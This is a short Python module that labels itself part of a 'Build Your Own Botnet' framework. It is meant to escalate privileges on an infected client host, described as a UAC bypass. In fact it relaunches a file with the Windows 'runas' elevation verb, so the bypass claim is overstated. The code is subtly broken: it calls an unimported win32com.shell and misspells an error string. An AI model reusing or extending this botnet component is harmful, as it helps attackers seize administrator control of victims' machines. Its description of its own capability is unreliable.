#!/usr/bin/python
# -*- coding: utf-8 -*-
'Escalate Privileges (Build Your Own Botnet)'

# standard library
import os
import sys
import ctypes

# packages
if sys.platform == 'win32':
    import win32com.client

# utilities
import util

# globals
packages = ['win32com.client']
platforms = ['win32']
results = {}
usage = 'escalate'
description = """
Attempt UAC bypass to escalate privileges in the current
context on the client host machine
"""

# main
def run(filename):
    """
    Attempt to escalate privileges

    `Required`
    :param str filename:    filename to run as administrator

    """
    try:
        if isinstance(filename, str) and os.path.isfile(filename):
            if bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0):
                return "Current user has administrator privileges"
            else:
                if os.name == 'nt':
                    return win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(filename))
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        else:
            return "Error: argument 'filename' must be a valid filename"
    except Exception as e:
        return "{} erorr: {}".format(__name__, str(e))
